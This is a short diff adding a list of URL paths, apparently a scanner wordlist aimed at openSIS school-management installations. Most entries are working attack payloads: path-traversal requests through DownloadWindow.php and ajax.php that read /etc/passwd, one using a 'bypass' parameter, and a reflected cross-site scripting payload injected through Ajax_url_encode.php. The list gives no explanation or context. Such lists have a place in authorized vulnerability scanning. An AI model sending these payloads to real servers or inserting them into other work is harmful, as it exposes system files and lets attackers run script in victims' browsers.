@@ -1,0 +1,9 @@
+/account/index.php
+/opensis/index.php
+/index.php
+/DownloadWindow.php?filename=../../../../../../../../etc/passwd
+/install/index.php
+/opensis/ajax.php?modname=misc/../../../../../../../../../../../../../etc/passwd&bypass=Transcripts.php
+/ajax.php?modname=misc/../../../../../../../../../../../../../etc/passwd&bypass=Transcripts.php
+
+/Ajax_url_encode.php?link_url=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
